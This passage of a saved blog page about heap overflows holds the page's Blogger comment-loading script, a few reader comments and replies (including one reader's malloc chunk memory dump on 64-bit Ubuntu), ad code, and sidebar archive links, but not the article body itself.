'http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment\x3d1436935304875#c2871692304115527012', 'author': {'name': 'amin suda', 'avatarUrl': '//img2.blogblog.com/img/b16-rounded.gif', 'profileUrl': 'https://www.blogger.com/profile/03789442097980433616'}, 'displayTime': '15 July 2015 at 06:41', 'deleteclass': 'item-control blog-admin pid-1749525693'}];
      var msgs = {'loadMore': 'Load more...', 'loading': 'Loading...', 'loaded': 'No more.', 'addComment': 'Add comment', 'reply': 'Reply', 'delete': 'Delete'};
      var config = {'blogId': '3500917063499850097', 'postId': '1709971016142527507', 'feed': 'http://www.mathyvanhoef.com/feeds/1709971016142527507/comments/default', 'authorName': 'Mathy', 'authorUrl': 'https://www.blogger.com/profile/12266874794108836514', 'baseUri': 'https://www.blogger.com', 'maxThreadDepth': 2};

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
        var comments = [];
        if (data && data.feed && data.feed.entry) {
          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
            var comment = {};
            // comment ID, parsed out of the original id format
            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
            comment.id = id ? id[2] : null;
            comment.body = bodyFromEntry(entry);
            comment.timestamp = Date.parse(entry.published.$t) + '';
            if (entry.author && entry.author.constructor === Array) {
              var auth = entry.author[0];
              if (auth) {
                comment.author = {
                  name: (auth.name ? auth.name.$t : undefined),
                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
                };
              }
            }
            if (entry.link) {
              if (entry.link[2]) {
                comment.link = comment.permalink = entry.link[2].href;
              }
              if (entry.link[3]) {
                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
                if (pid && pid[1]) {
                  comment.parentId = pid[1];
                }
              }
            }
            comment.deleteclass = 'item-control blog-admin';
            if (entry.gd$extendedProperty) {
              for (var k in entry.gd$extendedProperty) {
                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
                  comment.displayTime = entry.gd$extendedProperty[k].value;
                }
              }
            }
            comments.push(comment);
          }
        }
        return comments;
      };

      var paginator = function(callback) {
        if (hasMore()) {
          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
          if (cursor) {
            url += '&published-min=' + new Date(cursor).toISOString();
          }
          window.bloggercomments = function(data) {
            var parsed = parse(data);
            cursor = parsed.length < 50 ? null
                : parseInt(parsed[parsed.length - 1].timestamp) + 1
            callback(parsed);
            window.bloggercomments = null;
          }
          url += '&callback=bloggercomments';
          var script = document.createElement('script');
          script.type = 'text/javascript';
          script.src = url;
          document.getElementsByTagName('head')[0].appendChild(script);
        }
      };
      var hasMore = function() {
        return !!cursor;
      };
      var getMeta = function(key, comment) {
        if ('iswriter' == key) {
          var matches = !!comment.author
              && comment.author.name == config.authorName
              && comment.author.profileUrl == config.authorUrl;
          return matches ? 'true' : '';
        } else if ('deletelink' == key) {
          return config.baseUri + '/delete-comment.g?blogID='
               + config.blogId + '&postID=' + comment.id;
        } else if ('deleteclass' == key) {
          return comment.deleteclass;
        }
        return '';
      };

      var replybox = null;
      var replyUrlParts = null;
      var replyParent = undefined;

      var onReply = function(commentId, domId) {
        if (replybox == null) {
          // lazily cache replybox, and adjust to suit this style:
          replybox = document.getElementById('comment-editor');
          if (replybox != null) {
            replybox.height = '250px';
            replybox.style.display = 'block';
            replyUrlParts = replybox.src.split('#');
          }
        }
        if (replybox && (commentId !== replyParent)) {
          replybox.src = '';
          document.getElementById(domId).insertBefore(replybox, null);
          replybox.src = replyUrlParts[0]
              + (commentId ? '&parentID=' + commentId : '')
              + '#' + replyUrlParts[1];
          replyParent = commentId;
        }
      };

      var hash = (window.location.hash || '#').substring(1);
      var startThread, targetComment;
      if (/^comment-form_/.test(hash)) {
        startThread = hash.substring('comment-form_'.length);
      } else if (/^c[0-9]+$/.test(hash)) {
        targetComment = hash.substring(1);
      }

      // Configure commenting API:
      var configJso = {
        'maxDepth': config.maxThreadDepth
      };
      var provider = {
        'id': config.postId,
        'data': items,
        'loadNext': paginator,
        'hasMore': hasMore,
        'getMeta': getMeta,
        'onReply': onReply,
        'rendered': true,
        'initComment': targetComment,
        'initReplyThread': startThread,
        'config': configJso,
        'messages': msgs
      };

      var render = function() {
        if (window.goog && window.goog.comments) {
          var holder = document.getElementById('comment-holder');
          window.goog.comments.render(holder, provider);
        }
      };

      // render now, or queue to render when library loads:
      if (window.goog && window.goog.comments) {
        render();
      } else {
        window.goog = window.goog || {};
        window.goog.comments = window.goog.comments || {};
        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
        window.goog.comments.loadQueue.push(render);
      }
    })();
// ]]>
  </script>
<div id="comment-holder">

<div id="bc_0_8C" kind="c"><div id="bc_0_8CT"><div id="bc_0_7T" class="comment-thread" kind="r" t="0" u="0"><ol id="bc_0_7TB"><li id="bc_0_0B" class="comment" kind="b"><div class="avatar-image-container"><img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/blank.gif"></div><div id="c5536168287748300702" class="comment-block"><div id="bc_0_0M" class="comment-header" kind="m"><cite class="user">Anonymous</cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment=1380008993151#c5536168287748300702">24 September 2013 at 09:49</a></span></div><p id="bc_0_0MC" class="comment-content">Really good read!</p><span id="bc_0_0MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-1768098087"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=3500917063499850097&amp;postID=5536168287748300702">Delete</a></span></span></div><div id="bc_0_0BR" class="comment-replies"></div><div id="bc_0_0B_box" class="comment-replybox-single"></div></li><li id="bc_0_1B" class="comment" kind="b"><div class="avatar-image-container"><img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/blank.gif"></div><div id="c6625724024262953766" class="comment-block"><div id="bc_0_1M" class="comment-header" kind="m"><cite class="user">Anonymous</cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment=1382174352989#c6625724024262953766">19 October 2013 at 11:19</a></span></div><p id="bc_0_1MC" class="comment-content">Thanks a lot for the article! Everything was explained nicely, and without assuming prior knowledge, which was what I needed :-) all the other articles assume too much</p><span id="bc_0_1MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-1844850874"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=3500917063499850097&amp;postID=6625724024262953766">Delete</a></span></span></div><div id="bc_0_1BR" class="comment-replies"></div><div id="bc_0_1B_box" class="comment-replybox-single"></div></li><li id="bc_0_2B" class="comment" kind="b"><div class="avatar-image-container"><img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/b16-rounded.gif"></div><div id="c7060743476201140147" class="comment-block"><div id="bc_0_2M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="https://www.blogger.com/profile/16746531841359451416">Dharma</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment=1400941374777#c7060743476201140147">24 May 2014 at 16:22</a></span></div><p id="bc_0_2MC" class="comment-content">Hi, Thanks a lot. Which version of gcc did you use?</p><span id="bc_0_2MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-2115464180"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=3500917063499850097&amp;postID=7060743476201140147">Delete</a></span></span></div><div id="bc_0_2BR" class="comment-replies"></div><div id="bc_0_2B_box" class="comment-replybox-single"></div></li><li id="bc_0_3B" class="comment" kind="b"><div class="avatar-image-container"><img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/blank.gif"></div><div id="c5751604748758866367" class="comment-block"><div id="bc_0_3M" class="comment-header" kind="m"><cite class="user">Anonymous</cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment=1403371897506#c5751604748758866367">21 June 2014 at 19:31</a></span></div><p id="bc_0_3MC" class="comment-content">Where is Updated example ? its not visible</p><span id="bc_0_3MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-452415535"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=3500917063499850097&amp;postID=5751604748758866367">Delete</a></span></span></div><div id="bc_0_3BR" class="comment-replies"></div><div id="bc_0_3B_box" class="comment-replybox-single"></div></li><li id="bc_0_4B" class="comment" kind="b"><div class="avatar-image-container"><img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/b16-rounded.gif"></div><div id="c4259282045714051864" class="comment-block"><div id="bc_0_4M" class="comment-header" kind="m"><cite class="user blog-author"><a rel="nofollow" href="https://www.blogger.com/profile/12266874794108836514">Mathy</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment=1403558611454#c4259282045714051864">23 June 2014 at 23:23</a></span></div><p id="bc_0_4MC" class="comment-content">It should be visible? Try to enable javascript (I have to fix it so it all works without JS... one day).</p><span id="bc_0_4MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-606357465"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=3500917063499850097&amp;postID=4259282045714051864">Delete</a></span></span></div><div id="bc_0_4BR" class="comment-replies"></div><div id="bc_0_4B_box" class="comment-replybox-single"></div></li><li id="bc_0_5B" class="comment" kind="b"><div class="avatar-image-container"><img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/blank.gif"></div><div id="c6659840930558450761" class="comment-block"><div id="bc_0_5M" class="comment-header" kind="m"><cite class="user">Anonymous</cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment=1422507408199#c6659840930558450761">29 January 2015 at 05:56</a></span></div><p id="bc_0_5MC" class="comment-content">Good stuff sir !!!!!!!!!</p><span id="bc_0_5MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-897731422"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=3500917063499850097&amp;postID=6659840930558450761">Delete</a></span></span></div><div id="bc_0_5BR" class="comment-replies"></div><div id="bc_0_5B_box" class="comment-replybox-single"></div></li><li id="bc_0_6B" class="comment" kind="b"><div class="avatar-image-container"><img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/b16-rounded.gif"></div><div id="c2871692304115527012" class="comment-block"><div id="bc_0_6M" class="comment-header" kind="m"><cite class="user"><a rel="nofollow" href="https://www.blogger.com/profile/03789442097980433616">amin suda</a></cite><span class="icon user"></span><span class="datetime secondary-text"><a rel="nofollow" href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html?showComment=1436935304875#c2871692304115527012">15 July 2015 at 06:41</a></span></div><p id="bc_0_6MC" class="comment-content">Great stuff!<br>I'm checking the trunk layout under 64bit ubuntu. But found out that it's not like what expected:<br><br>0x601ff0: 0x00000000 0x00000000 0x00000000 0x00000000<br>0x602000: 0x00000000 0x00000000 0x00000031 0x00000000<br>0x602010: 0x41414141 0x41414141 0x41414141 0x41414141<br>0x602020: 0x41414141 0x41414141 0x41414141 0x41414141<br><br>This is the trunk of malloc(32).<br>The "0x00000031" is correct( 48 bytes of overall size of trunk)<br>but the the 'prev_size', 'fd', 'bk' are all 0.<br>Do you happen to know why?<br><br></p><span id="bc_0_6MN" class="comment-actions secondary-text" kind="m"><a kind="i" href="javascript:;" target="_self" o="r">Reply</a><span class="item-control blog-admin pid-1749525693"><a o="d" target="_self" href="https://www.blogger.com/delete-comment.g?blogID=3500917063499850097&amp;postID=2871692304115527012">Delete</a></span></span></div><div id="bc_0_6BR" class="comment-replies"></div><div id="bc_0_6B_box" class="comment-replybox-single"></div></li></ol><div id="bc_0_7I" class="continue" kind="ci" style="display: none;"><a href="javascript:;" target="_self">Add comment</a></div><div id="bc_0_7T_box" class="comment-replybox-thread"><iframe allowtransparency="true" class="blogger-iframe-colorize blogger-comment-from-post" frameborder="0" height="250px" id="comment-editor" name="comment-editor" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/comment-iframe.html" width="100%" data-resized="true" style="display: block;"></iframe></div><div id="bc_0_7L" class="loadmore loaded" kind="rb"><a href="javascript:;" target="_self">Load more...</a></div></div></div></div></div>
</div>
<p class="comment-footer">
</p><div class="comment-form">
<a name="comment-form"></a>
<p>
</p>
<a href="https://www.blogger.com/comment-iframe.g?blogID=3500917063499850097&amp;postID=1709971016142527507&amp;blogspotRpcToken=2741927" id="comment-editor-src"></a>

<script type="text/javascript" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/592886021-comment_from_post_iframe.js"></script>
<script type="text/javascript">
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
    </script>
</div>
<p></p>
<div id="backlinks-container">
<div id="Blog1_backlinks-container"><a name="links"></a><h4>Links naar dit bericht</h4>
<p class="comment-footer">
<a class="comment-link" href="https://www.blogger.com/blog-this.g" id="Blog1_backlinks-create-link" target="_blank">Create a Link</a>
</p>
</div>
</div>
</div>
</div>
<div class="inline-ad" yrjscon="" hidden="">
<script type="text/javascript"><!--
google_ad_client="pub-2753532741085396";
google_ad_host="pub-1556223355139109";
google_ad_width=468;
google_ad_height=15;
google_ad_format="468x15_0ads_al_s";
google_ad_host_channel="0001";
google_color_border="FFFFFF";
google_color_bg="FFFFFF";
google_color_link="444444";
google_color_url="444444";
google_color_text="444444";
//--></script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
</div>
</div></div>
</div>
<div class="blog-pager" id="blog-pager">
<span id="blog-pager-newer-link">
<a class="blog-pager-newer-link" href="http://www.mathyvanhoef.com/2013/04/ucsb-ictf-hacking-nuclear-plants-and.html" id="Blog1_blog-pager-newer-link" title="Newer Post">Newer Post</a>
</span>
<span id="blog-pager-older-link">
<a class="blog-pager-older-link" href="http://www.mathyvanhoef.com/2012/11/common-pitfalls-when-writing-exploits.html" id="Blog1_blog-pager-older-link" title="Older Post">Older Post</a>
</span>
<a class="home-link" href="http://www.mathyvanhoef.com/">Home</a>
</div>
<div class="clear"></div>
<div class="post-feeds">
<div class="feed-links">
Subscribe to:
<a class="feed-link" href="http://www.mathyvanhoef.com/feeds/1709971016142527507/comments/default" target="_blank" type="application/atom+xml">Post Comments (Atom)</a>
</div>
</div>
<script type="text/javascript">window.___gcfg = {'lang': 'en_GB'};</script>
</div></div>
</div>
</div>
<div class="column-left-outer">
<div class="column-left-inner">
<aside>
</aside>
</div>
</div>
<div class="column-right-outer">
<div class="column-right-inner">
<aside>
<div class="sidebar section" id="sidebar-right-1"><div class="widget PopularPosts" data-version="1" id="PopularPosts1">
<h2>Popular Posts</h2>
<div class="widget-content popular-posts">
<ul>
<li>
<a href="http://www.mathyvanhoef.com/2012/05/whatsapp-considered-insecure.html">WhatsApp Considered Insecure</a>
</li>
<li>
<a href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html">Understanding the Heap &amp; Exploiting Heap Overflows</a>
</li>
<li>
<a href="http://www.mathyvanhoef.com/2012/09/compat-wireless-injection-patch-for.html">Compat-Wireless Injection Patch for Aircrack-ng</a>
</li>
<li>
<a href="http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html">Exploiting 'INSERT INTO' SQL Injections Ninja Style</a>
</li>
<li>
<a href="http://www.mathyvanhoef.com/2013/12/reversing-and-exploiting-arm-binaries.html">Reversing and Exploiting ARM Binaries: rwthCTF Trafman</a>
</li>
</ul>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=3500917063499850097&amp;widgetType=PopularPosts&amp;widgetId=PopularPosts1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;PopularPosts1&quot;));" target="configPopularPosts1" title="Edit">
<img alt="" height="18" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon18_wrench_allbkg.png" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div><div class="widget AdSense" data-version="1" id="AdSense1" yrjscon="" hidden="">
<div class="widget-content">
<script type="text/javascript"><!--
google_ad_client="pub-2753532741085396";
google_ad_host="pub-1556223355139109";
google_ad_width=200;
google_ad_height=200;
google_ad_format="200x200_as";
google_ad_type="text_image";
google_ad_host_channel="0001";
google_color_border="FFFFFF";
google_color_bg="FFFFFF";
google_color_link="444444";
google_color_url="3778CD";
google_color_text="444444";
//--></script>
<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=3500917063499850097&amp;widgetType=AdSense&amp;widgetId=AdSense1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;AdSense1&quot;));" target="configAdSense1" title="Edit">
<img alt="" height="18" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon18_wrench_allbkg.png" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div><div class="widget LinkList" data-version="1" id="LinkList1">
<h2>Other Blogs</h2>
<div class="widget-content">
<ul>
<li><a href="http://www.arneswinnen.net/">Arne Swinnen</a></li>
<li><a href="https://vagosec.org/">Tom Van Goethem</a></li>
</ul>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=3500917063499850097&amp;widgetType=LinkList&amp;widgetId=LinkList1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;LinkList1&quot;));" target="configLinkList1" title="Edit">
<img alt="" height="18" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon18_wrench_allbkg.png" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div><div class="widget Subscribe" data-version="1" id="Subscribe1">
<div style="white-space:nowrap">
<h2 class="title">Subscribe To</h2>
<div class="widget-content">
<div class="subscribe-wrapper subscribe-type-POST">
<div class="subscribe expanded subscribe-type-POST" id="SW_READER_LIST_Subscribe1POST" style="display:none;">
<div class="top">
<span class="inner" onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1POST&quot;));">
<img class="subscribe-dropdown-arrow" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/arrow_dropdown.gif">
<img align="absmiddle" alt="" border="0" class="feed-icon" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon_feed12.png">
Posts
</span>
<div class="feed-reader-links">
<a class="feed-reader-link" href="https://www.netvibes.com/subscribe.php?url=http%3A%2F%2Fwww.mathyvanhoef.com%2Ffeeds%2Fposts%2Fdefault" target="_blank">
<img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/subscribe-netvibes.png">
</a>
<a class="feed-reader-link" href="https://add.my.yahoo.com/content?url=http%3A%2F%2Fwww.mathyvanhoef.com%2Ffeeds%2Fposts%2Fdefault" target="_blank">
<img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/subscribe-yahoo.png">
</a>
<a class="feed-reader-link" href="http://www.mathyvanhoef.com/feeds/posts/default" target="_blank">
<img align="absmiddle" class="feed-icon" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon_feed12.png">
Atom
</a>
</div>
</div>
<div class="bottom"></div>
</div>
<div class="subscribe" id="SW_READER_LIST_CLOSED_Subscribe1POST" onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1POST&quot;));">
<div class="top">
<span class="inner">
<img class="subscribe-dropdown-arrow" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/arrow_dropdown.gif">
<span onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1POST&quot;));">
<img align="absmiddle" alt="" border="0" class="feed-icon" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon_feed12.png">
Posts
</span>
</span>
</div>
<div class="bottom"></div>
</div>
</div>
<div class="subscribe-wrapper subscribe-type-PER_POST">
<div class="subscribe expanded subscribe-type-PER_POST" id="SW_READER_LIST_Subscribe1PER_POST" style="display:none;">
<div class="top">
<span class="inner" onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1PER_POST&quot;));">
<img class="subscribe-dropdown-arrow" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/arrow_dropdown.gif">
<img align="absmiddle" alt="" border="0" class="feed-icon" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon_feed12.png">
Comments
</span>
<div class="feed-reader-links">
<a class="feed-reader-link" href="https://www.netvibes.com/subscribe.php?url=http%3A%2F%2Fwww.mathyvanhoef.com%2Ffeeds%2F1709971016142527507%2Fcomments%2Fdefault" target="_blank">
<img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/subscribe-netvibes.png">
</a>
<a class="feed-reader-link" href="https://add.my.yahoo.com/content?url=http%3A%2F%2Fwww.mathyvanhoef.com%2Ffeeds%2F1709971016142527507%2Fcomments%2Fdefault" target="_blank">
<img src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/subscribe-yahoo.png">
</a>
<a class="feed-reader-link" href="http://www.mathyvanhoef.com/feeds/1709971016142527507/comments/default" target="_blank">
<img align="absmiddle" class="feed-icon" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon_feed12.png">
Atom
</a>
</div>
</div>
<div class="bottom"></div>
</div>
<div class="subscribe" id="SW_READER_LIST_CLOSED_Subscribe1PER_POST" onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1PER_POST&quot;));">
<div class="top">
<span class="inner">
<img class="subscribe-dropdown-arrow" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/arrow_dropdown.gif">
<span onclick="return(_SW_toggleReaderList(event, &quot;Subscribe1PER_POST&quot;));">
<img align="absmiddle" alt="" border="0" class="feed-icon" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon_feed12.png">
Comments
</span>
</span>
</div>
<div class="bottom"></div>
</div>
</div>
<div style="clear:both"></div>
</div>
</div>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=3500917063499850097&amp;widgetType=Subscribe&amp;widgetId=Subscribe1&amp;action=editWidget&amp;sectionId=sidebar-right-1" onclick="return _WidgetManager._PopupConfig(document.getElementById(&quot;Subscribe1&quot;));" target="configSubscribe1" title="Edit">
<img alt="" height="18" src="./Mathy Vanhoef_ Understanding the Heap &amp; Exploiting Heap Overflows_files/icon18_wrench_allbkg.png" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div><div class="widget BlogArchive" data-version="1" id="BlogArchive1">
<h2>Blog Archive</h2>
<div class="widget-content">
<div id="ArchiveList">
<div id="BlogArchive1_ArchiveList">
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/search?updated-min=2016-01-01T00:00:00%2B01:00&amp;updated-max=2017-01-01T00:00:00%2B01:00&amp;max-results=1">
2016
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2016_03_01_archive.html">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/search?updated-min=2015-01-01T00:00:00%2B01:00&amp;updated-max=2016-01-01T00:00:00%2B01:00&amp;max-results=3">
2015
</a>
<span class="post-count" dir="ltr">(3)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2015_10_01_archive.html">
October
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2015_09_01_archive.html">
September
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2015_03_01_archive.html">
March
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/search?updated-min=2014-01-01T00:00:00%2B01:00&amp;updated-max=2015-01-01T00:00:00%2B01:00&amp;max-results=2">
2014
</a>
<span class="post-count" dir="ltr">(2)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2014_09_01_archive.html">
September
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2014_05_01_archive.html">
May
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">
▼&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/search?updated-min=2013-01-01T00:00:00%2B01:00&amp;updated-max=2014-01-01T00:00:00%2B01:00&amp;max-results=5">
2013
</a>
<span class="post-count" dir="ltr">(5)</span>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2013_12_01_archive.html">
December
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2013_11_01_archive.html">
November
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2013_06_01_archive.html">
June
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
►&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2013_04_01_archive.html">
April
</a>
<span class="post-count" dir="ltr">(1)</span>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate expanded">
<a class="toggle" href="javascript:void(0)">
<span class="zippy toggle-open">
▼&nbsp;
</span>
</a>
<a class="post-count-link" href="http://www.mathyvanhoef.com/2013_02_01_archive.html">
February
</a>
<span class="post-count" dir="ltr">(1)</span>
<ul class="posts">
<li><a href="http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html">Understanding the Heap &amp; Exploiting Heap Overflows...</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul class="hierarchy">
<li class="archivedate collapsed">
<a class="toggle" href="javascript:void(0)">
<span class="zippy">
